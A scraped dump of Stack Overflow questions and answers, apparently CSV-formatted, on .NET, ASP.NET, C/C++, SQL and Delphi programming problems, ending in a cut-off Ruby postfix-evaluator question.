<p>Right now, I have serialized the data (Generic List) to an Xml file and I'm deserializing it on load as needed.</p>

<p>My question is should I use the XmlSerializer or the BinaryFormatter? I'm not worried about file size, but serialization speed.</p>
","33708","","<p><code>BinaryFormatter</code> is faster than <code>XmlSerializer</code>. It has to deal with much less bloated format without string parsing issues. </p>
"
"<p>What is the exact relationship, in IIS7 and ASP.Net, between :</p>

<ul>
<li>IIS Worker processes</li>
<li>Threads</li>
<li>AppDomains</li>
<li>Applications</li>
<li>incoming requests</li>
</ul>

<p>I'm hoping for an answer in a format similar to :</p>

<p>""Each IIS worker process hosts many appdomains which each spawn a single thread in response to each request...."" etc. , and any nuances mentioned.</p>

<p>Thanks in advance. </p>
","33708","","<p>Each worker process hosts several AppDomains (at least one per ASP.NET app, i.e. a Website or Virtual Directory). An incoming request is assigned a thread from thread pool when it comes.</p>
"
"<p>My controllers turn over the request to the appropriate service. The Service then makes calls to various Repositories. Repositories use Linq to Sql Entities purely for DataAccess and then map and return as Domain Objects. The service then decides what the Controller will present and replaces the DO with Presentation objects which are returned to the Controller to display in View.</p>

<p>SO I have Services-Repositories-Domain Objects- Presentation Objects</p>

<p>I am asking because it seems like i have a lot of objects, some not doing anything but passing data. Is this a reasonable scenairo or am i not following proper MVC pattern?</p>
","33708","","<p>If your application is big enough, your pattern makes sense. Otherwise, I smell overengineering...</p>

<p>Ask yourself: what if this layer didn't exist and you'll find out if it's true or not.</p>
"
"<p>This may be a daft question as I can see the security reason for it to happen the way it does...</p>

<p>I have a licensing c# project, this has a class which has a method which generates my license keys. I have made this method private as I do not want anybody else to be able to call my method for obvious reasons</p>

<p>The next thing I want to do is to have my user interface, which is in another c# project which is referencing the licensing dll to be the only other 'thing' which can access this method outside of itself, is this possible or do i need to move it into the same project so that it all compiles to the same dll and I can access its members?</p>

<blockquote>
  <p>LicensingProject<br/>
  -LicensingClass<br/>
  --Private MethodX (GeneratesLicenseKeys) <br/></p>
  
  <p>LicensingProject.UI<br/>
  -LicensingUiClass<br/>
  --I want to be able to be the only class to be able to access MethodX</p>
</blockquote>

<p>There is a reason why the license Key Generator is not just in the UI, that is because the licensing works by generating a hash on itself and compares it to the one generated by the License Generator.</p>

<p>I would prefer not to all compile to the dll as my end users do not need the UI code.</p>

<p>I know that by common sense a private method, is just that. I am stumped.</p>
","33708","","<p><code>public</code>, <code>private</code>, ... stuff are just enforced by the compiler. You can use reflection to access them pretty easily (assuming the code has required permissions, which is a reasonable assumption as he has complete control on the machine). Don't rely on that assuming nobody can call it.</p>
"
"<p>I need to force the initiation of download of a .sql file, when user clicks a button in my  ASP .NET (C#) based web application.</p>

<p>As in, when the button is clicked, a save as dialog should open at the client end...</p>

<p>How do I do this?</p>

<p><strong>EDIT</strong></p>

<p>This is the code I am using</p>

<pre><code>        string sql = """";
        using (System.IO.StreamReader rdr = System.IO.File.OpenText(fileName))
        {
            sql = rdr.ReadToEnd();
        }
        Response.ContentType = ""text/plain"";
        Response.AddHeader(""Content-Disposition"", ""attachment; filename=Backup.sql"");
        Response.Write(sql);
        Response.End();
</code></pre>

<p>This is the error that I'm getting...</p>

<p><img src=""http://img40.imageshack.us/img40/2103/erroro.gif"" alt=""alt text"" /></p>

<p>What's wrong?</p>
","33708","","<p>Create a separate HTTP Handler (DownloadSqlFile.ashx):</p>

<pre><code>&lt;%@ WebHandler Language=""C#"" Class=""DownloadHandler"" %&gt;

using System;
using System.Web;

public class DownloadHandler : IHttpHandler {
    public void ProcessRequest(HttpContext context) {
        var fileName = ""myfile.sql"";
        var r = context.Response;
        r.AddHeader(""Content-Disposition"", ""attachment; filename="" + fileName);
        r.ContentType = ""text/plain"";
        r.WriteFile(context.Server.MapPath(fileName));
    }
    public bool IsReusable { get { return false; } }
}
</code></pre>

<p>Then make the button in your ASP.NET page navigate to <code>DownloadSqlFile.ashx</code>.</p>
"
"<p>I'm reading/writing data off of a named pipe. On the writing side it says that it's writing a constant 110 bytes. On the Reading side for the majority of time it says that it's reading 110 bytes which is correct, but other times it says its reading 220 bytes or 330 bytes. Which is right in the fact that when I print it out it's printing out the same message two or three times in a row within the same read(). In the code below for reading am I doing something wrong with the memset to clear the char? I can't think of any other way it's reading more then is being written unless something is left over in the buffer.</p>

<pre><code>int fd1, numread;
char bufpipe[5000];

	while(1)
	{
		fd1 = open(""/tmp/testPipe"", O_RDONLY);
		numread = read(fd1,bufpipe, 5000);//-&gt;this should always be 110
		if(numread &gt; 1)
		{
			printf(""READ: %i"", numread); 
			bufpipe[numread+1] = '\0';
			memset(bufpipe,'\0',5001);
			close(fd1);
		}
	}
</code></pre>
","33708","","<p>Your assumption that a <code>read</code> will execute immediately after a <code>write</code> is not true. The writer process might write to the pipe a couple of times before a read is encountered. Written data will be added to the end of buffer. Put it differently, read and write are not packet oriented. They are stream oriented. It means that <code>write</code> just adds data to the buffer and <code>read</code> just gets anything available to it.</p>
"
"<p>I am wondering if there is an elegant way to check for the existence of a DB? In brief, how do test the connection of a db connection string?</p>

<p>Thanks</p>
","33708","","<p>Set the <code>Initial Catalog=master</code> in the connection string and execute:</p>

<pre><code>select count(*) from sysdatabases where name = @name
</code></pre>

<p>with <code>@name</code> set to the name of the database. </p>

<p>If you want to check the connection string as a whole (and not existence of an independent database), try connecting to it in a <code>try/catch</code> block.</p>
"
"<p>The prog in c#:</p>

<pre><code>  private void listBox1_Click(object sender, EventArgs e)
  {
        String data = (String)this.listBox1.SelectedItem;
        data = data.TrimEnd(new char[] { '\r', '\n' });

        try
        {
            ip = Dns.GetHostAddresses(data);
        }
        catch (SocketException ex)
        {
            MessageBox.Show(ex.ErrorCode.ToString());
        }

        clientIP = new IPEndPoint(ip[0], 6000);

        newSock.Bind(clientIP);
        newSock.Listen(100);

        resetEvent.Set();
    }
</code></pre>

<p>In the above code, I obtain the ip-address of the remote host who is shown in the listbox and correspondingly in order to start accepting messages need to create an <code>IPEndPoint</code>(<code>clientIP</code>).</p>

<p><code>newSock</code> is a variable of type socket initialized as:</p>

<pre><code>newSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
</code></pre>

<p>The problem is in the line where I bind the socket newSock to the IPEndPoint clientIP where I am getting an error saying it is an invalid address.
However to cross check I tried to display the ip-address on a message box which it did correctly.
So what exactly is going wrong??</p>
","33708","","<p>You shouldn't bind a socket to remote host address. It's used to indicate on which inbound IP address you should listen. You should either specify one of your own IP addresses (if you want to listen only on a single IP) or specify <code>IPAddress.Any</code> (0.0.0.0) to listen on all IP addresses you have.</p>

<p>By the way, if you want to connect to a remote address, you shouldn't use <code>Bind</code> at all. You'd just use the <code>Connect</code> method</p>
"
"<p>hello i'm developing an application that includs a web service, on development time i run the service locally on my pc, than i publish the service to a remote server,
i wanna know how can i take the web reference that i got and just change the adress of the service to the remote server to check that every thing is ok</p>
","33708","","<p>Right click on your Web reference, click properties, and choose Url behavior: Dynamic in properies window. The URL of the Web service will be automatically mapped to a configuration option in the  <code>Web.config</code> file that you can change easily, without recompilation:</p>

<p><img src=""http://i44.tinypic.com/ivd1rm.jpg"" alt=""Screenshot"" title="""" /></p>
"
"<p>I have the following queue class (taken from wordpress):</p>

<pre><code>#include&lt;iostream.h&gt;

class Queue
    {
    private:
     int data;
     Queue*next;
    public:
     void Enque(int);
     int Deque();
    }*head,*tail;    

    void Queue::enque(int data)
    {
     Queue *temp;
    temp=new Queue;
    temp-&gt;data=data;
    temp-&gt;next=NULL;
    if(heads==NULL)
     heads=temp;
    else
    tail-&gt;next=temp;
    tail=temp;
    }

    int Queue::deque()
    {
    Queue* temp;//
    temp=heads;
    heads=heads-&gt;next;
    return temp-&gt;data;
    }
</code></pre>

<p>I'm trying to figure out why the compiler tells me that I have a multiple definition
of ""head"" and ""tail""- without success. </p>

<p>edit: When the compiler gives the error message it opens up a locale_facets.tcc file
 from I-don't-know-where and says that the error is on line 2497 in  the following function:</p>

<pre><code>bool
 __verify_grouping(const char* __grouping, size_t __grouping_size,
        const string&amp; __grouping_tmp)
</code></pre>

<p>Does anyone have any insights?</p>
","33708","","<p>If your assignment is not directly related to queue implementation, you might want to use the built in <code>std::queue</code> class in C++:</p>

<pre><code>#include &lt;queue&gt;

void test() {
    std::queue&lt;int&gt; myQueue;
    myQueue.push(10);
    if (myQueue.size())
        myQueue.pop(); 
}
</code></pre>
"
"<p>I need a SQL query to find the names of existing databases.</p>
","33708","","<p>Here is a query for showing all databases in one Sql engine</p>

<pre><code>Select * from Sys.Databases
</code></pre>
"
"<p>I'm trying to make a meta tag in my view based on data in my model...my view code looks like this:</p>

<pre><code>&lt;meta name=""description"" content=""&lt;%=Html.Encode(Model.MetaDescription) %&gt;"" /&gt;
</code></pre>

<p>But my output looks like this:  </p>

<pre><code>meta name=""description"" content=""&amp;lt;%=Html.Encode(Model.MetaDescription) %&gt;"" /&gt;
</code></pre>

<p>What the heck am I doing wrong?</p>
","33708","","<p>You are probably adding this <code>meta</code> tag to a <code>&lt;head&gt;</code> tag which is marked at <code>runat=""server""</code>. Try: </p>

<pre><code>&lt;meta name=""description"" content='&lt;%=Html.Encode(Model.MetaDescription) %&gt;' /&gt;
</code></pre>

<p>I don't have a clear idea about what the actual problem is, as I don't have the full source, but to workaround:</p>

<pre><code>&lt;meta name=""description"" content=&lt;%= ""\"""" + Html.Encode(Model.MetaDescription) + ""\"""" %&gt; /&gt;
</code></pre>
"
"<p>I need to have a query which list all the user according to the date value in the database. Problems is this, in the database the date format is 5/5/2009 4:30:12 but I want to compare with 5/5/2009. I think the value of the based date is 5/5/2009 12:00:00 and that's why I couldn't query it. </p>

<p>The query is something like</p>

<p>dim db = new databcontext
dim user = from u in db.datacontext where u.signUpTime = 5/5/2009 select u.</p>

<p>May someone please check this problem.</p>

<p>Thanks in advance.</p>
","33708","","<p>Your theory is correct. You should either use a range in your where clause:</p>

<pre><code>u.SignupTime &gt;= new DateTime(2009,5,5,0,0,0) AndAlso _
u.SignupTime &lt; new DateTime(2009,5,6,0,0,0)
</code></pre>

<p>or check only the date:</p>

<pre><code>u.SignupTime.Date = new DateTime(2009,5,5)
</code></pre>
"
"<p>In .NET can I use any string as a dictionary key? This is part of a templating engine and I'm planning allow users to add their custom headers and values. </p>

<p>Headers will be something like ""Value of X"" or ""Summary of Analyse &amp; XYZ Reports"", I'm worried if they would get an exception in a rare character or something like that.</p>

<p>I assume there size limit but expecting it to be larger than 256 characters. MSDN hasn't got any details on the subject.</p>
","33708","","<p>Yes, it can use any valid string (which is limited to a couple billion bytes).</p>

<p>BTW, you might pass a custom <code>IEqualityComparer&lt;T&gt;</code> that you might pass to the <code>Dictionary</code> constructor which might require a maximum limit.</p>
"
"<p>On a <em>System.Web.UI.Page.ViewPage</em> I have access to the current User (<em>System.Security.Principal.IPrincipal</em>) but I don't have access to the User through a <em>System.Web.UI.UserControl.ViewUserControl</em> (the <em>ViewPage</em> property is internal).</p>

<p>How can my partial view (<em>.ascx</em>) display information depending on who the <em>IPrincipal</em> is?</p>
","33708","","<pre><code>HttpContext.Current.User
</code></pre>
"
"<p>I found that there are two type of methods called static methods and instance methods and their differences.
But still I couldnt understand the advantages of one over another.</p>

<p>Sometimes i feel that static methods are not 100% object oriented.</p>

<p>Are there any performance differences between this two.</p>

<p>Can someone help?</p>

<p>Thanks n Regards,
Jay...</p>
","33708","","<p>Instance methods require passing an implicit parameter (the <code>this</code> reference) which make them slightly slower than <code>static</code> methods. But that really should not be the reason to prefer them.</p>

<p>For a related discussion, look at:</p>

<p><a href=""http://stackoverflow.com/questions/731763/should-c-methods-that-can-be-static-be-static"">http://stackoverflow.com/questions/731763/should-c-methods-that-can-be-static-be-static</a></p>
"
"<p>I'm trying to figure out how to do this as I'm not sure what's the proper way of doing this.</p>

<p>I've got several strings that I want to store/save permanently, even after the application is closed. How should I proceed? Do I read or write from a textfile?</p>
","33708","","<p>Yes, you might store it in a simple text file or use a <a href=""http://msdn.microsoft.com/en-us/library/aa730869%28VS.80%29.aspx"" rel=""nofollow"">settings file</a>.</p>
"
"<p>I'm trying to build a generic grid view in an ASP.NET MVC application.</p>

<p>Let me explain with some code:</p>

<pre><code>public interface ITrustGrid&lt;T&gt;
{
    IPagedList&lt;T&gt; Elements { get; set; }
    IList&lt;IColumn&lt;T&gt;&gt; Columns { get; set; }
    IList&lt;string&gt; Headers { get; }
}
</code></pre>

<p>This is an interface of a class that allows me to set columns and expressions in my controller. </p>

<p>I pass implementations to a partial view like this:</p>

<pre><code>&lt;% Html.RenderPartial(""SimpleTrustGridViewer"", ViewData[""employeeGrid""] as TrustGrid&lt;EmployeeInfoDTO&gt;); %&gt;
</code></pre>

<p>The problem is that I can't figure out how to make the partial view that renders the grid generic.</p>

<p>In other words, I want to turn this:</p>

<pre><code>&lt;%@ Control Language=""C#"" Inherits=""System.Web.Mvc.ViewUserControl&lt;ITrustGrid&lt;EmployeeInfoDTO&gt;&gt;"" %&gt;
</code></pre>

<p>into something like this:</p>

<pre><code>&lt;%@ Control Language=""C#"" Inherits=""System.Web.Mvc.ViewUserControl&lt;ITrustGrid&lt;T&gt;&gt;"" %&gt;
</code></pre>

<p>=> How can I make my partial view generic in the most simple way?</p>

<p><strong>EDIT:</strong></p>

<p>I solved this by using a TrustGridBuilder that has a public TrustGrid GetTrustGrid() method which returns a non-generic TrustGrid. The TrustGrid contains strings instead of linq stuff. So I execute the linq in the GetTrustGrid() method and put the strings in a TrustGrid object.</p>

<p>Thanks for everybody to help me on the right track.</p>
","33708","","<p>It's not possible to do it like that. The reason is the <code>.aspx</code> will generate a class that you don't have much control on it and you can't add a generic parameter to it. I guess the most straightforward way is to pass it as <code>object</code>.</p>
"
"<p>While working on a wysiwyg editor, I hit the wall of Firefox restricting access to the clipboard (haven't yet tested Webkit).</p>

<ol>
<li><p>Can someone explain WHY <strong>copying</strong> to the clipboard is restricted?<br/><br />
I just cannot think of a single way that this can be used nefariously, and use-cases abound where lack of 'copy' support is a problem.<br/>
In fact, whole libraries such as <a href=""http://code.google.com/p/zeroclipboard/"" rel=""nofollow"">zeroClipboard</a> are there just to facilitate this function.<br/><br/>
(I understand - but disagree - that allowing <em>read</em> access to the clipboard can create a hole, though a popup would solve that.)</p></li>
<li><p>Are there any good hacks/methods that would give me a 'paste' button?  I have seen posts refer to 'textarea trick' among others, without explanation of how they work.</p></li>
<li><p>Is there a term for the all-too-common scenario where production by legitimate users is hampered by 'security precautions', and the 'bad guys' use hacks [like zeroClip] that render the secure feeling completely false?</p></li>
</ol>

<p>I am aware that there is a convoluted 'official' method that is available if I sign my scripts.. [which I do not have the knowledge or resources to do], but that even that would generate a popup whenever I use it.</p>
","33708","","<p>You might have cut something from an application that doesn't support undo or something to paste somewhere else. If it was allowed to modified the clipboard automatically, you could have lost the data you had cut.</p>
"
"<p>I need to create an Intranet website (page) which allows users to indicate a local network folder to copy to a production location.  Currently this is done manually using xcopy in batch files.</p>

<p>What I am looking for is approaches on triggering the copy so it's done in the middle of the night and an approach to copy the files.  I suppose I can run xcopy from my application, but is this a good way to do this?  Should I use System.IO name space objects to copy the files?  Is there a better way all together?</p>

<p>The application will be written in C# and ASP.NET.  We currently use .NET 2.0/3.0, but I have no issues using .NET 3.5 if it contains better libraries for the solution.</p>

<p>Basically a user will indicate which network folder they need copied along with some other business information.  The folder indicated and all sub-folders need to be copied to target location (not set by user).</p>

<p>If there is already an application out there which does this, I am not opposed to that either.  I have no need to write stuff that already exists.</p>
","33708","","<p>For the first problem (copying at midnight), I suggest setting up a scheduled task that runs the already existing batch file (or any program, for that matter)</p>
"
"<p>I need some help to describe, in technical words, why a 64-bit application prompts a ""Not a valid Win32 application"" in Windows 32-bit on a 32-bit machine? Any MSDN reference is greatly appreciate it (I couldn't google a reliable source). I know it shouldn't run, but I have no good explanation for this.</p>
","33708","","<p>A 32 bit OS runs in 32-bit <a href=""http://en.wikipedia.org/wiki/Protected%5Fmode"" rel=""nofollow"">protected mode</a>. A 64 bit OS runs in <a href=""http://en.wikipedia.org/wiki/Long%5Fmode"" rel=""nofollow"">long mode</a> (i.e. 64-bit protected mode). 64 bit instructions (used by 64 bit programs) are only available when the CPU is in long mode; so you can't execute them in 32-bit protected mode, in which a 32 bit OS runs.</p>

<p>(The above statement applies to x86 architecture)</p>

<p>By the way, the reason for ""Not a valid Win32 application"" error message is that 64 bit executables are stored in PE32+ format while 32 bit executables are stored in PE32 format. PE32+ files are not valid executables for 32 bit Windows. It cannot understand that format.</p>
"
"<p>I'm working on a small website for a local church.  The site needs to allow administrators to edit content and post new events/updates.  The only ""secure"" information managed by the site will be the admins' login info and a church directory with phone numbers and addresses.</p>

<p>How at risk would I be if I were to go without SSL and just have the users login using straight HTTP?  Normally I wouldn't even consider this, but it's a small church and they need to save money wherever possible.</p>
","33708","","<p>Plain HTTP is vulnerable to sniffing. If you don't want to buy SSL certificates, you can use self-signed certificates and ask your clients to trust that certificate to circumvent the warning shown by the browser (as your authenticated users are just a few known admins, this approach makes perfect sense).</p>
"
"<p>I've got a question about design. I have a class <strong>CodesTree</strong> that is building some sort of a binary tree according to data provided and the algorithm it's using needs a priority queue (nota bene also implemented using binary tree). There may be different implementations of a priority queue so I would like to allow the user of my class to choose the implementation he prefers. I designed the interface of the queue like this:</p>

<pre><code>public interface IPriorityQueue&lt;T&gt;
{
        T GetMax();
        void Insert(T value);
        int Count { get; }
}
</code></pre>

<p>The question is - how do I allow the user to choose the implementation? The only way I can think of is to make a public property of a type <strong>IPriorityQueue</strong> in my <strong>CodesTree</strong> class and let user set this property to an instance of a class he wants to use. But I don't think it is a good idea, because the user may specify the queue that for example already has a few elements or, having a reference to the queue, delete some elements (and he shouldn't). It just seems a bit not elegant. What is the best way?</p>
","33708","","<p>What you are looking is called <a href=""http://en.wikipedia.org/wiki/Dependency%5FInjection"" rel=""nofollow"">dependency injection</a>. You can either pass an instance of the implementation in the constructor or use dependency injection frameworks out there to handle that.</p>
"
"<p>I have a DetailsView that I'm posting back - and inside of that is a UserControl. I'm having some difficulty located it in the postback data.</p>

<p>As an example:</p>

<pre><code>&lt;asp:DetailsView ID=""dvDetailsView"" runat=""Server"" AutoGenerateRows=""false""&gt;
&lt;Fields&gt;
  &lt;asp:TemplateField&gt;
    &lt;ItemTemplate&gt;
      Some text here
    &lt;/ItemTemplate&gt;
    &lt;EditItemTemplate&gt;
      &lt;uc:UserControl ID=""ucUserControl"" runat=""server"" /&gt;
    &lt;/EditItemTemplate&gt;
    &lt;InsertItemTemplate&gt;
      &lt;uc:UserControl ID=""ucUserControl"" runat=""server"" /&gt;
    &lt;/InsertItemTemplate&gt;
  &lt;/asp:TemplateField&gt;
&lt;/Fields&gt;
&lt;/asp:DetailsView&gt;
</code></pre>

<p>When I postback, I would assume I would do something like this:</p>

<pre><code>MyUserControlType ucUserControl = dvDetailsView.FindControl(""ucUserControl"") as MyUserControlType;
</code></pre>

<p>But this finds nothing. In fact, I can't even find this baby by walking around in QuickWatch...</p>

<p>What do I need to do to find this thing??</p>

<p><strong>EDIT:</strong> It turns out my usercontrol id was being changed - but why? I do have the same ID on both the insert and edit templates, but commenting that out made no difference.</p>
","33708","","<p><strong>After</strong> <code>DataBind</code>ing the control, you'd use:</p>

<pre><code>dvDetailsView.Rows[0].Cells[0].FindControl(""ucUserControl"")
</code></pre>

<p>And make sure you are doing this only in Edit mode as the control only exists in <code>EditItemTemplate</code>.</p>
"
"<p>Is it considered an acceptable practice to use Modules instead of Classes with Shared member functions in VB.Net?</p>

<p>I tend to avoid Modules, because they feel like left over remains from VB6 and don't really seem to fit in anymore. On the other hand, there doesn't seem to be much difference between using a Module and a Class with only Shared members. It's not that often that I really have much need for either, but sometimes there are situations where they present a simple solution.</p>

<p>I'm curious to hear whether you have any opinion or preferences one way or the other.</p>
","33708","","<p><code>Module</code>s are VB counterparts to C# <code>static</code> classes. When your class is designed solely for helper functions and extension methods and you <strong>don't</strong> want to allow <strong>inheritance</strong> and <strong>instantiation</strong>, you use a <code>Module</code>.</p>

<p>By the way, using <code>Module</code> is not really subjective and it's <strong>not deprecated</strong>. Indeed you must use a <code>Module</code> when it's appropriate. .NET Framework itself does it many times (<code>System.Linq.Enumerable</code>, for instance). To declare an extension method, it's required to use <code>Module</code>s.</p>
"
"<p>I've noticed that in my project, we frequently are writing recursive functions.</p>

<p>My question is: is there any way to create the recursive function as generic function for each hierarchy structure that is using the recursive iteration?</p>

<p>Maybe I can use a delegate that gets the root and the end flag of the recursion?</p>

<p>Any ideas?</p>

<p>Thanks.</p>
","33708","","<p>I'm not sure what exactly your question is asking for but a recursive function can be generic. There's no limitation on that. For instance:</p>

<pre><code>int CountLinkedListNodes&lt;T&gt;(MyLinkedList&lt;T&gt; input) {
   if (input == null) return 0;
   return 1 + CountLinkedListNodes&lt;T&gt;(input.Next);
}
</code></pre>
"
"<p>I'm in a ASP.NET application using Windows Authentication.</p>

<p>I'm using HttpContext.Current.User.Identity.Name to get the username of the currently authenticated user, which gets me a username in the format DOMAIN\USERNAME.  This is working fine.</p>

<p>Is there an easy way to convert this to a display name (e.g. ""Richard Gadsden"") like the one that appears on the top of my start menu in XP?</p>

<p>If I have to, I guess I can go through System.DirectoryServices and query into ADSI, but surely there's an easier way?</p>
","33708","","<p>I guess ADSI is the way to go. It's pretty easy. I don't see an easier way. You just query for <code>LDAP://&lt;SID=user-sid&gt;</code> and get the distinguished name property.</p>
"
"<p>Do you have any idea, why the following code:</p>

<pre><code>public class A
{
    public static int i = B.i + 1;
}

public class B 
{
    public static int i = A.i + 1;
}
</code></pre>

<p>Having:</p>

<pre><code>        int aa = A.i;
        int bb = B.i;
</code></pre>

<p>Says that aa = 2 (!!!) and bb = 1.</p>

<p>I have a STACK OVERFLOW in my brain!!!
As far as i understand, recursion stops on static methods, but why?
If you remake int i to the getters (to debug and understand why on earth it works like that), you get the stack overflow exception.</p>
","33708","","<p>A field is not like a property getter. It just stores the data, not any operation. In fact, the initialization will be moved to another method (static constructor, <code>.cctor</code>) which will initialize static variables in the class. </p>

<p>At the beginning, both will equal to 0. Before you access <code>A.i</code> for the first time, the method <code>.cctor</code> for class <code>A</code> runs. It tries to access <code>B.i</code> for the first time which will cause execution of the static constructor of class <code>B</code>. <code>.cctor</code> of <code>B</code> will try to access <code>A.i</code> but since it's not the first time a field is being accessed, static constructor of <code>A</code> will <strong>not</strong> run anymore. It just fetches the current value of <code>A</code> which is still 0. Consequently, <code>B.i</code> will be equal to 1 when <code>B..cctor</code> finishes execution and control is returned to <code>A..cctor</code>. It will see the value <code>B.i</code> and adds 1 to it and stores it in <code>A.i</code>. Thus, <code>A.i</code> will be equal to 2 (1+1) and <code>B.i</code> will be equal to 1.</p>

<p>The only guarantee you get is that the static constructor will be called <strong>before</strong> any static member of that class is accessed. </p>
"
"<p>I have a website I've created in Visual Studio 2008 and I need to take it live. How can I backup the database file to a .bak so I can hand it over to the hosting company to place on the server?</p>
","33708","","<p>You don't need a backup to do so (I assume you are using the <code>AttachDbFilename</code> model that Visual Studio uses by default). Just send them the <code>mdf</code> and tell them to attach it to their SQL server instance.</p>
"
"<p>Why does StrToInt('X5') returns 5 in Delphi?  Is X some scientific notation or something like it?  Are there some other chars which will be converted to Integer as well?</p>
","33708","","<p>It's hex notation. Try XF to see it return 15.</p>
"
"<p>I have this membership site setup on my local machine using the ASP.NET membership provider.  When I go to:</p>

<p><a href=""http://localhost/admin/"" rel=""nofollow"">http://localhost/admin/</a></p>

<p>It redirects me to </p>

<p><a href=""http://localhost/Login.aspx?ReturnUrl=%2fadmin%2fDefault.aspx"" rel=""nofollow"">http://localhost/Login.aspx?ReturnUrl=%2fadmin%2fDefault.aspx</a></p>

<p>Which is fine.  But after I put in my login information, the page just seems to refresh.  It doesn't actually log me in, and it just looks like it refreshes the page.  If I change the URL to:</p>

<p><a href=""http://localhost/Login.aspx"" rel=""nofollow"">http://localhost/Login.aspx</a></p>

<p>It works fine.  It logs me in no problem, and redirects me to my default page.  I also checked the live site and it does the same thing.  Any ideas?  Thanks in advance!</p>

<p>EDIT:  Here is the markup:</p>

<pre><code>&lt;asp:Login ID=""Login1"" runat=""server"" CssClass=""LoginBox"" TitleText=""Please Log In""&gt;
	&lt;LayoutTemplate&gt;
		&lt;h2&gt;
			Please Log In:&lt;/h2&gt;
		&lt;p runat=""server"" id=""FailureText"" visible=""false""&gt;
			Either your email address or password was incorrect. Please try again.&lt;/p&gt;
		&lt;strong&gt;Email&lt;/strong&gt;&lt;br /&gt;
		&lt;asp:TextBox ID=""UserName"" runat=""server""&gt;&lt;/asp:TextBox&gt;
		&lt;asp:RequiredFieldValidator ID=""UserNameRequired"" runat=""server"" ControlToValidate=""UserName""
			Text=""*""&gt;&lt;/asp:RequiredFieldValidator&gt;
		&lt;/p&gt;
		&lt;p&gt;
			&lt;strong&gt;Password&lt;/strong&gt;&lt;br /&gt;
			&lt;asp:TextBox ID=""Password"" runat=""server"" TextMode=""Password""&gt;&lt;/asp:TextBox&gt;
			&lt;asp:RequiredFieldValidator ID=""PasswordRequired"" runat=""server"" ControlToValidate=""Password""
				Text=""*""&gt;&lt;/asp:RequiredFieldValidator&gt;
		&lt;/p&gt;
		&lt;p&gt;
			&lt;asp:Button ID=""Login"" CommandName=""Login"" runat=""server"" Text=""Log In"" /&gt;&lt;/p&gt;
		&lt;p&gt;
			Please &lt;a runat=""server"" id=""Link_ContactUs""&gt;contact &lt;/a&gt;an administrator if you
			are having trouble logging in or have forgotten your password.&lt;/p&gt;
	&lt;/LayoutTemplate&gt;
&lt;/asp:Login&gt;
</code></pre>

<p>web.config setup:</p>

<pre><code>&lt;authentication mode=""Forms""&gt;
  &lt;forms loginUrl=""/Login.aspx""
         protection=""All""
         timeout=""60""
         name=""AppNameCookie""
         path=""/Admin""
         requireSSL=""false""
         slidingExpiration=""true""
         defaultUrl=""/Admin/Default.aspx""
         cookieless=""UseCookies""
         enableCrossAppRedirects=""false"" /&gt;
&lt;/authentication&gt;
</code></pre>
","33708","","<p>Can you show us some code? If you are using <code>FormsAuthentication.RedirectFromLoginPage</code> method, you should get what you want. Are you using <code>FormsAuthentication.SetAuthCookie</code> instead?</p>

<h3>Update</h3>

<p>Change <code>path=""/Admin""</code> in <code>web.config</code> to <code>path=/</code></p>

<p>The reason it doesn't work is that your authentication cookie is only set in <code>/Admin</code> path and your browser treats URLs as case sensitive so it won't send the authentication cookie back to the <code>/admin/Default.aspx</code> page (lowercase <code>admin</code>).</p>
"
"<p>We already know <a href=""http://stackoverflow.com/questions/388595/why-use-deflate-instead-of-gzip-for-text-files-served-by-apache"">deflate encoding is a winner</a> over gzip with respect to speed of encoding, decoding and compression size.</p>

<p>So why do no large sites (that I can find) send it (when I use a browser that accepts it)?</p>

<p><a href=""http://developer.yahoo.com/performance/rules.html#gzip"">Yahoo claims</a> deflate is ""less effective"". Why?</p>

<p>I maintain HTTP server software that prefers deflate, so I'd like to know if there's some really good reason not to continue doing so.</p>
","33708","","<p>As far as I know (disclaimer: and I'm not an expert here, just what I've heard), <code>gzip</code> uses the same algorithm as <code>deflate</code> but it has more header stuff that make it have a larger size (relative to <code>deflate</code>). However, I think <code>deflate</code> is supported by less clients and proxies.</p>
"
"<p>Is Model-View-ViewModel the best pattern to use in WPF? Are there any downsides?</p>
","33708","","<p>Yes, it's an overkill for small hello world-style applications.</p>
"
"<p>Duplicate:</p>

<blockquote>
  <p><a href=""http://stackoverflow.com/questions/236878/what-to-use-var-or-object-name-type"">What to use var or object name type</a></p>
</blockquote>

<p>I couldn't understand the need of var keyword in C# 3.0 What is the advantage in using it.
i saw <a href=""http://stackoverflow.com/questions/41479/use-of-var-keyword-in-c"">this</a> question but did not understand the real purpose of using it</p>
","33708","","<p>The primary reason for its existence is the introduction of anonymous types in C#. You can construct types on the fly that don't have a name. How would you specify their name? The answer: You can't. You just tell the compiler to infer them for you:</p>

<pre><code>var user = users.Where(u=&gt; u.Name == ""Mehrdad"")
                .Select(u =&gt; new { u.Name, u.Password });
</code></pre>
"
"<p>I have this <code>struct</code> in C++:</p>

<pre><code>struct TEXTMSGSTR
{
    HWND Sender;
    wchar_t Text[255];
    //wchar_t *Text;
};
</code></pre>

<p>and in C#:</p>

<pre><code>public struct TEXTMSGSTR
{
    public IntPtr Sender;
    public ? Text;
}
</code></pre>

<p>which I am sending as part of a <code>COPYDATASTRUCT</code> message from unmanaged to managed code. What would be the correct construction of the <code>struct</code> on the C# side as C# does not have <code>wchar_t</code>? I have tried string etc. but of course errors appear!</p>

<p>Can anybody give me some ideas about how to marshal this as well as I am new to this stuff?:</p>

<pre><code>TEXTMSGSTR tx = (TEXTMSGSTR)Marshal.PtrToStructure(cds.lpData, typeof(TEXTMSGSTR));
</code></pre>
","33708","","<pre><code>[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
public struct TEXTMSGSTR
{
    public IntPtr Sender;
    [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 255)]
    public string Text;
}
</code></pre>
"
"<p>I tried to make a small script to evaluate post-fix expressions in Ruby. </p>

<pre><code>def evaluate_post(expression)

    my_stack = Stack.new

    expression.each_char do |ch|        
    begin    
        # Get individual characters and try to convert it to integer
        y = Integer(ch)

        # If its an integer push it to the stack
        my_stack.push(ch)

    rescue    
        # If its not a number then it must be an operation
        # Pop the last two numbers
        num2 = my_stack.pop.to_i            
        num1 = my_stack.pop.to_i


        case ch
        when ""+""   
    	    answer = num1 + num2	    
        when ""*"" 	   
    	    answer = num1* num2	   
        when ""-"" 	    
    	    answer = num1- num2	    
        when ""/"" 	    
    	    answer = num1/ num2	   
        end   

        # If the operation was other than + - * / then answer is nil
        if answer== nil
    	my_stack.push(num2)
    	my_stack.push(num1)
        else
    	my_stack.push(answer)
    	answer = nil
        end
    end
    end
